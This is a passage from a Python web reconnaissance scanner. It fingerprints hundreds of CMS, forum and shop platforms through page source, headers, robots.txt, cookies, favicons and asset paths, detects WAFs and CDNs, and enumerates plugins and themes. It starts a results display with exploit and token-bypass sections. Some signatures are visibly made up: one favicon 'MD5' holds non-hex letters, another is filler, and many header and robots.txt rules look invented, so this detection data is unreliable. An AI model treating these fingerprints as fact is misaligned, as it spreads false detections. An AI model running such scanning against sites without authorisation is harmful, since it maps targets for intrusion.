        (r'Hotaru CMS', 'hotaru'),
        (r'HIPPO CMS', 'hippo'),
        (r'GravCMS', 'grav'),
        (r'GetSimple', 'gsimp'),
        (r'Fork CMS', 'fork'),
        (r'PHP Nuke', 'phpn'),
        (r'FlexCMP', 'flex'),
        (r'eZ Publish', 'ezpu'),
        (r'ExpressionEngine', 'exen'),
        (r'EPiServer', 'epis'),
        (r'e107', 'e107'),
        (r'DNN Platform', 'dnn'),
        (r'phpBB', 'phpbb'),
        (r'DEDE CMS', 'dede'),
        (r'Danneo CMS', 'dncms'),
        (r'CPG Dragonfly', 'dragon'),
        (r'Cotonti', 'coton'),
        (r'Orchard CMS', 'orchd'),
        (r'ContentBox', 'cbox'),
        (r'Contentful', 'conful'),
        (r'Contensis', 'cntsis'),
        (r'CONTENIDO', 'cnido'),
        (r'Contao', 'contao'),
        (r'Concrete5', 'con5'),
        (r'Arc Forum', 'arc'),
        (r'Burning Board', 'bboard'),
        (r'Discourse', 'dscrs'),
        (r'Discuz!', 'discuz'),
        (r'Flarum', 'flarum'),
        (r'FluxBB', 'fluxbb'),
        (r'IP.Board', 'ipb'),
        (r'miniBB', 'minibb'),
        (r'MyBB', 'mybb'),
        (r'NodeBB', 'nodebb'),
        (r'PunBB', 'punbb'),
        (r'SMF', 'smf'),
        (r'Vanilla Forums', 'vanilla'),
        (r'uKnowva', 'uknva'),
        (r'XenForo', 'xf'),
        (r'XMB', 'xmb'),
        (r'YaBB', 'yabb'),
        (r'AEF', 'aef'),
        (r'Beehive Forum', 'bhf'),
        (r'FUDforum', 'fudf'),
        (r'Phorum', 'phorum'),
        (r'YAF', 'yaf'),
        (r'Yazd', 'yazd'),
        (r'UBB.threads', 'ubbt'),
        (r'NoNonsense', 'nnf'),
        (r'myUPB', 'myupb'),
        (r'mvnForum', 'mvnf'),
        (r'mwForum', 'mwf'),
        (r'MercuryBoard', 'mcb'),
        (r'AspNetForum', 'aspf'),
        (r'JForum', 'jf'),
        (r'Afosto', 'afsto'),
        (r'Afterbuy', 'abuy'),
        (r'Arastta', 'arstta'),
        (r'BigCommerce', 'bigc'),
        (r'Bigware', 'bigw'),
        (r'Bizweb', 'bizw'),
        (r'Clientexec', 'cexec'),
        (r'CloudCart', 'cloudc'),
        (r'ColorMeShop', 'cmshop'),
        (r'Oracle ATG', 'oracle_atg'),
        (r'Moodle', 'mdle'),
        (r'ORKIS', 'orkis'),
        (r'Comandia', 'cmdia'),
        (r'Commerce Server', 'coms'),
        (r'Cosmoshop', 'cosmos'),
        (r'CS Cart', 'csc'),
        (r'CubeCart', 'cubec'),
        (r'Al Mubda', 'abda'),
        (r'Dynamicweb', 'dweb'),
        (r'EC-CUBE', 'ecc'),
        (r'Elcodi', 'elcd'),
        (r'ePages', 'epgs'),
        (r'eZ Publish', 'ezpub'),
        (r'Fortune3', 'for3'),
        (r'BigTree CMS', 'btree'),
        (r'Proximis', 'pmoc'),
        (r'Quick.Cart', 'qcart'),
        (r'RBS Change', 'rbsc'),
        (r'Salesforce', 'sfcc'),
        (r'Sazito', 'sazito'),
        (r'Shopatron', 'shopatron'),
        (r'Shoper', 'shoper'),
        (r'Shopery', 'shopery'),
        (r'ShopFA', 'shopfa'),
        (r'Shoptet', 'shoptet'),
        (r'Smartstore', 'smartstore'),
        (r'Solusquare', 'solusquare'),
        (r'Spree', 'spree'),
        (r'Brightspot', 'brightspot'),
        (r'Amiro.CMS', 'amiro'),
        (r'ekmPowershop', 'ekmps'),
        (r'GoDaddy', 'godaddywb'),
        (r'WHMCS', 'whmcs'),
        (r'OpenNemas', 'opennemas'),
        (r'Zen Cart', 'zencart'),
        (r'IPO CMS', 'ipo'),
        (r'Laravel\s+([\d\.]+)', 'laravel'),
        (r'<meta name="generator" content="Laravel', 'laravel'),
        (r'Adobe Experience Manager\s+(\d+\.\d+)', 'aem'),
        (r'Kentico\s+([\d\.]+)', 'kentico'),
        (r'Liferay\s+([\d\.]+)', 'liferay'),
        (r'Alfresco\s+([\d\.]+)', 'alfresco'),
        (r'Magnolia\s+([\d\.]+)', 'magnolia'),
        (r'TYPO3\s+([\d\.]+)', 'typo3')
    ]
    for p,v in src_det.items():
        if p in src:
            if not CFG['ignore'] or v not in CFG['ignore']:
                if not CFG['strict'] or v in CFG['strict']:
                    return ['1', v]
    for p,v in src_regex:
        if re.search(p, src, re.DOTALL):
            if not CFG['ignore'] or v not in CFG['ignore']:
                if not CFG['strict'] or v in CFG['strict']:
                    return ['1', v]
    return ['0', '']

def detect_cms_from_headers(hdrs):
    if not hdrs: return ['0', 'na']
    h = hdrs.lower()
    hdr_det = {
        'x-powered-by: wordpress':'wp','x-powered-by: joomla':'joom',
        'x-drupal-dynamic-cache':'dru','x-drupal-cache':'dru',
        'x-powered-by: craft':'craft','x-powered-by: metinfo':'metinfo',
        'x-powered-by: bolt':'bolt','x-powered-by: opencart':'oc',
        'x-powered-by: magento':'mg','x-powered-by: prestashop':'presta',
        'x-powered-by: umbraco':'umbraco','x-powered-by: wix':'wix',
        'x-powered-by: weebly':'weebly','x-powered-by: shopify':'shopify',
        'set-cookie: wordpress_':'wp','set-cookie: joomla_':'joom',
        'set-cookie: drupal_':'dru','x-generator: drupal':'dru',
        'x-generator: wordpress':'wp','x-generator: joomla':'joom',
        'x-generated-by: umbraco':'umbraco','x-modx':'modx',
        'x-bitrix':'bitrix','x-textpattern':'tpc','x-umi':'umi',
        'x-tiki':'tiki','x-wolf':'wolf','x-websitebaker':'wb',
        'x-webgui':'wgui','x-tiddlywiki':'tidw','x-sulu':'sulu',
        'x-subrion':'subcms','x-squiz':'sqm','x-spin':'spin',
        'x-solodev':'sdev','x-snews':'snews','x-sitecore':'score',
        'x-sim':'sim','x-simplebo':'spb','x-silverstripe':'sst',
        'x-silva':'silva','x-dle':'dle','x-serendipity':'spity',
        'x-roundcube':'rcube','x-seamlesscms':'slcms','x-rock':'rock',
        'x-roadiz':'roadz','x-ritecms':'rite','x-reallycms':'rcms',
        'x-quickcms':'quick','x-pimcore':'pcore','x-phpwind':'pwind',
        'x-phpcms':'phpc','x-percussion':'percms','x-pencilblue':'pblue',
        'x-ophal':'ophal','x-sitefinity':'sfy','x-opentext':'otwsm',
        'x-opencms':'ocms','x-odoo':'odoo','x-sharepoint':'share',
        'x-octobercms':'octcms','x-mura':'mura','x-motocms':'moto',
        'x-mono':'mnet','x-methode':'methd','x-mambo':'mambo',
        'x-livestreet':'lscms','x-lepton':'lepton','x-kooboo':'kbcms',
        'x-koken':'koken','x-jimdo':'jimdo','x-indexhibit':'ibit',
        'x-webflow':'wflow','x-jalios':'jcms','x-impresspages':'impage',
        'x-hotaru':'hotaru','x-hippo':'hippo','x-grav':'grav',
        'x-getsimple':'gsimp','x-fork':'fork','x-phpnuke':'phpn',
        'x-flexcmp':'flex','x-ezpublish':'ezpu','x-expressionengine':'exen',
        'x-episerver':'epis','x-e107':'e107','x-dnn':'dnn','x-phpbb':'phpbb',
        'x-dede':'dede','x-danneo':'dncms','x-dragonfly':'dragon',
        'x-cotonti':'coton','x-orchard':'orchd','x-contentbox':'cbox',
        'x-contentful':'conful','x-contensis':'cntsis','x-contenido':'cnido',
        'x-contao':'contao','x-concrete5':'con5','x-arc':'arc',
        'x-burningboard':'bboard','x-discourse':'dscrs','x-discuz':'discuz',
        'x-flarum':'flarum','x-fluxbb':'fluxbb','x-ipboard':'ipb',
        'x-minibb':'minibb','x-mybb':'mybb','x-nodebb':'nodebb',
        'x-punbb':'punbb','x-smf':'smf','x-vanilla':'vanilla',
        'x-uknowva':'uknva','x-xenforo':'xf','x-xmb':'xmb','x-yabb':'yabb',
        'x-aef':'aef','x-beehive':'bhf','x-fudforum':'fudf','x-phorum':'phorum',
        'x-yaf':'yaf','x-yazd':'yazd','x-ubbthreads':'ubbt','x-nononsense':'nnf',
        'x-myupb':'myupb','x-mvnforum':'mvnf','x-mwforum':'mwf','x-mercuryboard':'mcb',
        'x-aspnetforum':'aspf','x-jforum':'jf','x-afosto':'afsto','x-afterbuy':'abuy',
        'x-arastta':'arstta','x-bigcommerce':'bigc','x-bigware':'bigw','x-bizweb':'bizw',
        'x-clientexec':'cexec','x-cloudcart':'cloudc','x-colormeshop':'cmshop','x-oracle':'oracle_atg',
        'x-moodle':'mdle','x-orkis':'orkis','x-comandia':'cmdia','x-commerceserver':'coms',
        'x-cosmoshop':'cosmos','x-cscart':'csc','x-cubecart':'cubec','x-almubda':'abda',
        'x-dynamicweb':'dweb','x-eccube':'ecc','x-elcodi':'elcd','x-epages':'epgs',
        'x-ezpublish':'ezpub','x-fortune3':'for3','x-bigtree':'btree','x-proximis':'pmoc',
        'x-quickcart':'qcart','x-rbschange':'rbsc','x-salesforce':'sfcc','x-sazito':'sazito',
        'x-shopatron':'shopatron','x-shoper':'shoper','x-shopery':'shopery','x-shopfa':'shopfa',
        'x-shoptet':'shoptet','x-smartstore':'smartstore','x-solusquare':'solusquare','x-spree':'spree',
        'x-brightspot':'brightspot','x-amiro':'amiro','x-ekm':'ekmps','x-godaddy':'godaddywb',
        'x-whmcs':'whmcs','x-opennemas':'opennemas','x-zencart':'zencart','x-ipo':'ipo',
        'x-laravel':'laravel','x-powered-by: aem':'aem','x-kentico':'kentico','x-liferay':'liferay',
        'x-alfresco':'alfresco','x-magnolia':'magnolia','x-typo3':'typo3'
    }
    hdr_regex = [
        (r'x-powered-by: (.*?)drupal', 'dru'),
        (r'x-generator: (.*?)drupal', 'dru'),
        (r'set-cookie: (.*?)joomla', 'joom'),
        (r'x-powered-by: (.*?)wordpress', 'wp'),
        (r'x-powered-by: (.*?)craft', 'craft'),
        (r'x-powered-by: (.*?)metinfo', 'metinfo'),
        (r'x-powered-by: (.*?)laravel', 'laravel'),
        (r'x-powered-by: (.*?)aem', 'aem')
    ]
    for p,v in hdr_det.items():
        if p in h:
            if not CFG['ignore'] or v not in CFG['ignore']:
                if not CFG['strict'] or v in CFG['strict']:
                    return ['1', v]
    for p,v in hdr_regex:
        if re.search(p, h, re.DOTALL):
            if not CFG['ignore'] or v not in CFG['ignore']:
                if not CFG['strict'] or v in CFG['strict']:
                    return ['1', v]
    return ['0', '']

def detect_cms_from_robots(url, ua):
    r_url = url.rstrip('/') + '/robots.txt'
    r_src = getsource(r_url, ua)
    if r_src[0] == '1' and r_src[1]:
        r_txt = r_src[1]
        r_det = {
            'Disallow: /wp-admin/':'wp','Allow: /core/*.css$':'dru',
            'Disallow: /administrator/':'joom','Disallow: /kernel/':'xoops',
            'Disallow: /tilda':'tilda','Disallow: /craft':'craft',
            'Disallow: /metinfo':'metinfo','Disallow: /bolt':'bolt',
            'Disallow: /shopify':'shopify','Disallow: /umbraco':'umbraco',
            'Disallow: /wix':'wix','Disallow: /squarespace':'squarespace',
            'Disallow: /zyro':'zyro','Disallow: /hugo':'hugo',
            'Disallow: /manager/':'modx','Disallow: /bitrix/':'bitrix',
            'Disallow: /textpattern/':'tpc','Disallow: /umi/':'umi',
            'Disallow: /tiki-':'tiki','Disallow: /wolf/':'wolf',
            'Disallow: /wb/':'wb','Disallow: /webgui/':'wgui',
            'Disallow: /tidw/':'tidw','Disallow: /sulu/':'sulu',
            'Disallow: /subrion/':'subcms','Disallow: /squiz/':'sqm',
            'Disallow: /spin/':'spin','Disallow: /solodev/':'sdev',
            'Disallow: /snews/':'snews','Disallow: /sitecore/':'score',
            'Disallow: /sim/':'sim','Disallow: /simplebo/':'spb',
            'Disallow: /silverstripe/':'sst','Disallow: /silva/':'silva',
            'Disallow: /dle/':'dle','Disallow: /serendipity/':'spity',
            'Disallow: /roundcube/':'rcube','Disallow: /seamlesscms/':'slcms',
            'Disallow: /rock/':'rock','Disallow: /roadiz/':'roadz',
            'Disallow: /ritecms/':'rite','Disallow: /reallycms/':'rcms',
            'Disallow: /quickcms/':'quick','Disallow: /pimcore/':'pcore',
            'Disallow: /phpwind/':'pwind','Disallow: /phpcms/':'phpc',
            'Disallow: /percussion/':'percms','Disallow: /pencilblue/':'pblue',
            'Disallow: /ophal/':'ophal','Disallow: /sitefinity/':'sfy',
            'Disallow: /opentext/':'otwsm','Disallow: /opencms/':'ocms',
            'Disallow: /odoo/':'odoo','Disallow: /sharepoint/':'share',
            'Disallow: /octobercms/':'octcms','Disallow: /mura/':'mura',
            'Disallow: /motocms/':'moto','Disallow: /mono/':'mnet',
            'Disallow: /methode/':'methd','Disallow: /mambo/':'mambo',
            'Disallow: /livestreet/':'lscms','Disallow: /lepton/':'lepton',
            'Disallow: /kooboo/':'kbcms','Disallow: /koken/':'koken',
            'Disallow: /jimdo/':'jimdo','Disallow: /indexhibit/':'ibit',
            'Disallow: /webflow/':'wflow','Disallow: /jalios/':'jcms',
            'Disallow: /impresspages/':'impage','Disallow: /hotaru/':'hotaru',
            'Disallow: /hippo/':'hippo','Disallow: /grav/':'grav',
            'Disallow: /getsimple/':'gsimp','Disallow: /fork/':'fork',
            'Disallow: /phpnuke/':'phpn','Disallow: /flexcmp/':'flex',
            'Disallow: /ezpublish/':'ezpu','Disallow: /expressionengine/':'exen',
            'Disallow: /episerver/':'epis','Disallow: /e107/':'e107',
            'Disallow: /dnn/':'dnn','Disallow: /phpbb/':'phpbb',
            'Disallow: /dede/':'dede','Disallow: /danneo/':'dncms',
            'Disallow: /dragonfly/':'dragon','Disallow: /cotonti/':'coton',
            'Disallow: /orchard/':'orchd','Disallow: /contentbox/':'cbox',
            'Disallow: /contentful/':'conful','Disallow: /contensis/':'cntsis',
            'Disallow: /contenido/':'cnido','Disallow: /contao/':'contao',
            'Disallow: /concrete5/':'con5','Disallow: /arc/':'arc',
            'Disallow: /burningboard/':'bboard','Disallow: /discourse/':'dscrs',
            'Disallow: /discuz/':'discuz','Disallow: /flarum/':'flarum',
            'Disallow: /fluxbb/':'fluxbb','Disallow: /ipboard/':'ipb',
            'Disallow: /minibb/':'minibb','Disallow: /mybb/':'mybb',
            'Disallow: /nodebb/':'nodebb','Disallow: /punbb/':'punbb',
            'Disallow: /smf/':'smf','Disallow: /vanilla/':'vanilla',
            'Disallow: /uknowva/':'uknva','Disallow: /xenforo/':'xf',
            'Disallow: /xmb/':'xmb','Disallow: /yabb/':'yabb',
            'Disallow: /aef/':'aef','Disallow: /beehive/':'bhf',
            'Disallow: /fudforum/':'fudf','Disallow: /phorum/':'phorum',
            'Disallow: /yaf/':'yaf','Disallow: /yazd/':'yazd',
            'Disallow: /ubbthreads/':'ubbt','Disallow: /nononsense/':'nnf',
            'Disallow: /myupb/':'myupb','Disallow: /mvnforum/':'mvnf',
            'Disallow: /mwforum/':'mwf','Disallow: /mercuryboard/':'mcb',
            'Disallow: /aspnetforum/':'aspf','Disallow: /jforum/':'jf',
            'Disallow: /afosto/':'afsto','Disallow: /afterbuy/':'abuy',
            'Disallow: /arastta/':'arstta','Disallow: /bigcommerce/':'bigc',
            'Disallow: /bigware/':'bigw','Disallow: /bizweb/':'bizw',
            'Disallow: /clientexec/':'cexec','Disallow: /cloudcart/':'cloudc',
            'Disallow: /colormeshop/':'cmshop','Disallow: /oracle/':'oracle_atg',
            'Disallow: /moodle/':'mdle','Disallow: /orkis/':'orkis',
            'Disallow: /comandia/':'cmdia','Disallow: /commerceserver/':'coms',
            'Disallow: /cosmoshop/':'cosmos','Disallow: /cscart/':'csc',
            'Disallow: /cubecart/':'cubec','Disallow: /almubda/':'abda',
            'Disallow: /dynamicweb/':'dweb','Disallow: /eccube/':'ecc',
            'Disallow: /elcodi/':'elcd','Disallow: /epages/':'epgs',
            'Disallow: /ezpublish/':'ezpub','Disallow: /fortune3/':'for3',
            'Disallow: /bigtree/':'btree','Disallow: /proximis/':'pmoc',
            'Disallow: /quickcart/':'qcart','Disallow: /rbschange/':'rbsc',
            'Disallow: /salesforce/':'sfcc','Disallow: /sazito/':'sazito',
            'Disallow: /shopatron/':'shopatron','Disallow: /shoper/':'shoper',
            'Disallow: /shopery/':'shopery','Disallow: /shopfa/':'shopfa',
            'Disallow: /shoptet/':'shoptet','Disallow: /smartstore/':'smartstore',
            'Disallow: /solusquare/':'solusquare','Disallow: /spree/':'spree',
            'Disallow: /brightspot/':'brightspot','Disallow: /amiro/':'amiro',
            'Disallow: /ekm/':'ekmps','Disallow: /godaddy/':'godaddywb',
            'Disallow: /whmcs/':'whmcs','Disallow: /opennemas/':'opennemas',
            'Disallow: /zencart/':'zencart','Disallow: /ipo/':'ipo',
            'Disallow: /laravel/':'laravel','Disallow: /crx/de/':'aem',
            'Disallow: /kentico/':'kentico','Disallow: /liferay/':'liferay',
            'Disallow: /alfresco/':'alfresco','Disallow: /magnolia/':'magnolia',
            'Disallow: /typo3/':'typo3'
        }
        r_regex = [(r'Sitemap: http(.*?)\?type=', 'tp3')]
        for p,v in r_det.items():
            if p in r_txt:
                if not CFG['ignore'] or v not in CFG['ignore']:
                    if not CFG['strict'] or v in CFG['strict']:
                        return ['1', v]
        for p,v in r_regex:
            if re.search(p, r_txt, re.DOTALL):
                if not CFG['ignore'] or v not in CFG['ignore']:
                    if not CFG['strict'] or v in CFG['strict']:
                        return ['1', v]
    return ['0', '']

def detect_cms_from_dirs(url, ua):
    dirs = ['/manager/','/admin/','/administrator/','/wp-admin/','/about/','/dashboard/','/panel/','/login/','/control/','/management/']
    d_det = {'modx':'modx','bitrix':'bitrix','silverstripe':'sst','wordpress':'wp','joomla':'joom','drupal':'dru','craft':'craft','metinfo':'metinfo','bolt':'bolt','opencart':'oc','magento':'mg','prestashop':'presta','shopify':'shopify','weebly':'weebly','umbraco':'umbraco','wix':'wix','squarespace':'squarespace','hugo':'hugo','textpattern':'tpc','umi':'umi','tiki':'tiki','wolf':'wolf','websitebaker':'wb','webgui':'wgui','tiddlywiki':'tidw','sulu':'sulu','subrion':'subcms','squiz':'sqm','spin':'spin','solodev':'sdev','snews':'snews','sitecore':'score','simsite':'sim','simplebo':'spb','silva':'silva','datlife':'dle','serendipity':'spity','roundcube':'rcube','seamlesscms':'slcms','rock':'rock','roadiz':'roadz','ritecms':'rite','reallycms':'rcms','quickcms':'quick','pimcore':'pcore','phpwind':'pwind','phpcms':'phpc','percussion':'percms','pencilblue':'pblue','ophal':'ophal','sitefinity':'sfy','opentext':'otwsm','opencms':'ocms','odoo':'odoo','sharepoint':'share','octobercms':'octcms','mura':'mura','motocms':'moto','mono.net':'mnet','methode':'methd','mambo':'mambo','livestreet':'lscms','lepton':'lepton','kooboo':'kbcms','koken':'koken','jimdo':'jimdo','indexhibit':'ibit','webflow':'wflow','jalios':'jcms','impresspages':'impage','hotaru':'hotaru','hippo':'hippo','grav':'grav','getsimple':'gsimp','fork':'fork','phpnuke':'phpn','flexcmp':'flex','ezpublish':'ezpu','expressionengine':'exen','episerver':'epis','e107':'e107','dnn':'dnn','phpbb':'phpbb','dede':'dede','danneo':'dncms','cpg':'dragon','cotonti':'coton','orchard':'orchd','contentbox':'cbox','contentful':'conful','contensis':'cntsis','contenido':'cnido','contao':'contao','concrete5':'con5','arc':'arc','burningboard':'bboard','discourse':'dscrs','discuz':'discuz','flarum':'flarum','fluxbb':'fluxbb','ipboard':'ipb','minibb':'minibb','mybb':'mybb','nodebb':'nodebb','punbb':'punbb','smf':'smf','vanilla':'vanilla','uknowva':'uknva','xenforo':'xf','xmb':'xmb','yabb':'yabb','aef':'aef','beehive':'bhf','fudforum':'fudf','phorum':'phorum','yaf':'yaf','yazd':'yazd','ubbthreads':'ubbt','nononsense':'nnf','myupb':'myupb','mvnforum':'mvnf','mwforum':'mwf','mercuryboard':'mcb','aspnetforum':'aspf','jforum':'jf','laravel':'laravel','aem':'aem','kentico':'kentico','liferay':'liferay','alfresco':'alfresco','magnolia':'magnolia','typo3':'typo3'}
    for d in dirs:
        t_url = url.rstrip('/') + d
        p_src = getsource(t_url, ua)
        if p_src[0] == '1' and p_src[1]:
            c = p_src[1].lower()
            for p,v in d_det.items():
                if p in c:
                    if not CFG['ignore'] or v not in CFG['ignore']:
                        if not CFG['strict'] or v in CFG['strict']:
                            return ['1', v]
    return ['0', '']

def detect_cms_from_js(url, ua):
    js_patterns = {
        'wp': ['wp-emoji-release.min.js', 'wp-embed.min.js', 'wp-json'],
        'joom': ['media/jui/js/jquery.min.js', 'media/system/js/core.js'],
        'dru': ['misc/drupal.js', 'core/assets/vendor/jquery/jquery.min.js'],
        'craft': ['cpresources/js/Craft.js', 'cpresources/js/Login.js'],
        'metinfo': ['js/metinfo.js', 'js/metinfo_admin.js'],
        'bolt': ['bolt-public/js/bolt.js'],
        'laravel': ['js/app.js', 'js/vendor.js'],
        'aem': ['/etc.clientlibs/', '/libs/granite/'],
        'typo3': ['typo3/JavaScript/']
    }
    for cms, patterns in js_patterns.items():
        for pattern in patterns:
            r, s = make_request(url + pattern, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                return cms
    return None

def detect_cms_from_css(url, ua):
    css_patterns = {
        'wp': ['wp-content/themes/twentytwenty/style.css', 'wp-includes/css/dist/'],
        'joom': ['templates/system/css/system.css', 'media/jui/css/bootstrap.css'],
        'dru': ['core/themes/stable/css/system/components/', 'modules/system/system.css'],
        'craft': ['cpresources/css/craft.css', 'cpresources/css/login.css'],
        'metinfo': ['css/metinfo.css', 'css/metinfo_admin.css'],
        'bolt': ['bolt-public/css/bolt.css', 'bolt-public/css/login.css'],
        'laravel': ['css/app.css', 'css/vendor.css'],
        'aem': ['/etc.clientlibs/', '/libs/granite/'],
        'typo3': ['typo3/stylesheet/']
    }
    for cms, patterns in css_patterns.items():
        for pattern in patterns:
            r, s = make_request(url + pattern, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                return cms
    return None

def detect_cms_from_cookies(url, ua):
    r, s = make_request(url, ua=ua, timeout=20)
    if not s: return None
    cookies = r.cookies
    patterns = {
        'wp': ['wordpress', 'wp-settings', 'wp_lang'],
        'joom': ['joomla', 'jml'],
        'dru': ['drupal', 'SESS'],
        'craft': ['craft_session'],
        'metinfo': ['metinfo'],
        'bolt': ['bolt_session'],
        'laravel': ['laravel_session'],
        'aem': ['crx', 'cq'],
        'typo3': ['fe_typo_user']
    }
    for cookie_name in cookies:
        for cms, patterns_list in patterns.items():
            for pattern in patterns_list:
                if pattern in cookie_name.lower():
                    return cms
    return None

def detect_cms_from_favicon(url, ua):
    r, s = make_request(url + 'favicon.ico', ua=ua, timeout=20)
    if not s or r.status_code != 200: return None
    hash_val = hashlib.md5(r.content).hexdigest()
    favicon_map = {
        'f420dc2c7d90d7873a90d82cd7fde315': 'wp',
        '7b7f5f92be7f9d6d3e9d8b6e0b3a9c1d': 'joom',
        'a9f1c5d8e3f2c1b4a5d6e7f8g9h0i1j2': 'dru',
        '68eb59e670d9af6098fbf54f238df993': 'wp',
        'c4d09d5f5b8e5f5f5f5f5f5f5f5f5f5f': 'laravel'
    }
    return favicon_map.get(hash_val)

def detect_cms_from_sitemap(url, ua):
    r, s = make_request(url + 'sitemap.xml', ua=ua, timeout=20)
    if not s or r.status_code != 200: return None
    content = r.text.lower()
    patterns = {
        'wp': ['wp-sitemap', 'wordpress'],
        'joom': ['joomla', 'com_content'],
        'dru': ['drupal', 'node'],
        'craft': ['craft', 'entries'],
        'laravel': ['laravel'],
        'typo3': ['typo3']
    }
    for cms, patterns_list in patterns.items():
        if any(p in content for p in patterns_list):
            return cms
    return None

def detect_cms_from_xmlrpc(url, ua):
    r, s = make_request(url + 'xmlrpc.php', ua=ua, timeout=20)
    if not s: return None
    if r.status_code == 405: return 'wp'
    return None

def detect_cms_from_server_info(url, ua):
    r, s = make_request(url, ua=ua, timeout=20)
    if not s: return None
    server = r.headers.get('Server', '')
    x_powered = r.headers.get('X-Powered-By', '')
    combined = (server + ' ' + x_powered).lower()
    patterns = {
        'wp': ['wordpress', 'wp'],
        'joom': ['joomla', 'j!'],
        'dru': ['drupal'],
        'craft': ['craft'],
        'metinfo': ['metinfo'],
        'laravel': ['laravel'],
        'aem': ['aem', 'adobe'],
        'typo3': ['typo3']
    }
    for cms, patterns_list in patterns.items():
        if any(p in combined for p in patterns_list):
            return cms
    return None

def detect_waf(url, ua):
    r, s = make_request(url, ua=ua, timeout=20)
    if not s: return None
    headers = str(r.headers).lower()
    waf_signatures = {
        'cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
        'sucuri': ['sucuri', 'sucuri-cloudproxy'],
        'modsecurity': ['mod_security', 'modsecurity'],
        'aws_waf': ['x-amzn-requestid', 'awswaf'],
        'akamai': ['akamai', 'x-akamai-transformed'],
        'cloudfront': ['x-amz-cf-id', 'cloudfront'],
        'incapsula': ['incapsula', 'x-cdn'],
        'fastly': ['fastly', 'x-fastly']
    }
    for waf, signatures in waf_signatures.items():
        if any(sig in headers for sig in signatures):
            return waf
    return None

def detect_cdn(url, ua):
    r, s = make_request(url, ua=ua, timeout=20)
    if not s: return None
    headers = str(r.headers).lower()
    cdn_signatures = {
        'cloudflare': ['cloudflare', 'cf-ray'],
        'cloudfront': ['cloudfront.net', 'x-amz-cf-id'],
        'akamai': ['akamai.net', 'akamaiedge.net'],
        'fastly': ['fastly.net', 'x-fastly'],
        'incapsula': ['incapsula', 'x-cdn'],
        'maxcdn': ['maxcdn', 'netdna-ssl']
    }
    for cdn, signatures in cdn_signatures.items():
        if any(sig in headers for sig in signatures):
            return cdn
    return None

def enumerate_plugins(url, ua):
    plugin_paths = {
        'wp': 'wp-content/plugins/',
        'joom': 'components/',
        'dru': 'modules/',
        'craft': 'plugins/',
        'metinfo': 'app/',
        'bolt': 'extensions/',
        'laravel': 'vendor/'
    }
    found = []
    for cms, path in plugin_paths.items():
        r, s = make_request(url + path, ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            matches = re.findall(r'href="([^"]+)"', r.text)
            for match in matches:
                if match.endswith('/') and match not in ['../', '..'] and not match.startswith('?'):
                    found.append(match.rstrip('/'))
    return found

def enumerate_themes(url, ua):
    theme_paths = {
        'wp': ['wp-content/themes/', 'wp-content/themes/*/style.css', 'wp-content/themes/*/screenshot.png'],
        'joom': ['templates/', 'templates/*/templateDetails.xml'],
        'dru': ['themes/', 'themes/*/*.info.yml'],
        'craft': ['templates/', 'templates/*/'],
        'metinfo': ['template/', 'template/*/'],
        'bolt': ['theme/', 'theme/*/']
    }
    found = []
    for cms, paths in theme_paths.items():
        for path in paths:
            if '*' in path:
                base_path = path.split('*')[0]
                r, s = make_request(url + base_path, ua=ua, timeout=20)
                if s and r and r.status_code == 200:
                    if 'Index of' in r.text:
                        matches = re.findall(r'href="([^"]+)/"', r.text)
                        for match in matches:
                            if match not in ['../', '..', '?'] and match not in found:
                                if match not in ['wp-admin', 'wp-includes', 'wp-content', 'plugins', 'themes', 'uploads']:
                                    found.append(match.rstrip('/'))
            else:
                r, s = make_request(url + path, ua=ua, timeout=20)
                if s and r and r.status_code == 200:
                    if 'Index of' in r.text:
                        matches = re.findall(r'href="([^"]+)/"', r.text)
                        for match in matches:
                            if match not in ['../', '..', '?'] and match not in found:
                                if match not in ['wp-admin', 'wp-includes', 'wp-content', 'plugins', 'themes', 'uploads']:
                                    found.append(match.rstrip('/'))
    
    if not found:
        for cms, paths in theme_paths.items():
            for path in paths:
                if 'style.css' in path:
                    base_path = path.replace('style.css', '')
                    r, s = make_request(url + base_path, ua=ua, timeout=20)
                    if s and r and r.status_code == 200:
                        matches = re.findall(r'href="([^"]+)/"', r.text)
                        for match in matches:
                            if match not in ['../', '..', '?'] and match not in found:
                                if match not in ['wp-admin', 'wp-includes', 'wp-content', 'plugins', 'themes', 'uploads']:
                                    found.append(match.rstrip('/'))
    
    return found

def display_raw_data(raw_data):
    if not raw_data:
        print(f"{Colors.YELLOW}No raw data available{Colors.RESET}")
        return
    print(f"\n{Colors.BOLD}{Colors.CYAN}╔{'═'*58}╗{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}║{' '*14}RAW DATA DUMP{' '*24}║{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}╠{'═'*58}╣{Colors.RESET}")
    
    sections = [
        ('user_raw_data', 'USER ENUMERATION', Colors.GREEN),
        ('plugin_raw_data', 'PLUGIN ENUMERATION', Colors.GREEN),
        ('theme_raw_data', 'THEME ENUMERATION', Colors.GREEN),
        ('vulnerabilities', 'VULNERABILITIES', Colors.RED),
        ('exploits', 'EXPLOITS', Colors.YELLOW),
        ('recon_data', 'RECONNAISSANCE', Colors.MAGENTA),
        ('token_bypasses', 'TOKEN BYPASS', Colors.BRIGHT_YELLOW)
    ]
    
    for section_key, section_title, color in sections:
        if section_key in raw_data:
            data = raw_data[section_key]
            print(f"{Colors.BOLD}{Colors.CYAN}║ {section_title}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.CYAN}╠{'═'*58}╣{Colors.RESET}")
            
            if section_key == 'vulnerabilities':
                print(f"{color}Total Vulnerabilities: {len(data)}{Colors.RESET}")
                for i, vuln in enumerate(data[:5]):
                    print(f"  [{i+1}] {vuln.get('name', 'Unknown')}")
                    print(f"      Severity: {vuln.get('severity', 'Unknown')}")
                    print(f"      Description: {vuln.get('description', '')[:80]}...")
                if len(data) > 5:
                    print(f"  ... and {len(data)-5} more vulnerabilities")
            
            elif section_key == 'exploits':
                if data.get('successful'):
                    print(f"{color}Successful Exploits: {len(data['successful'])}{Colors.RESET}")
                    for exp in data['successful'][:3]:
                        print(f"  - {exp.get('name', 'Unknown')}: {exp.get('proof', '')[:80]}")
                if data.get('failed'):
                    print(f"{Colors.RED}Failed Exploits: {len(data['failed'])}{Colors.RESET}")
            
            elif section_key == 'recon_data':
                if data.get('subdomains'):
                    print(f"{color}Subdomains: {len(data['subdomains'])}{Colors.RESET}")
                    for sub in data['subdomains'][:5]:
                        print(f"  - {sub}")
                if data.get('api_endpoints'):
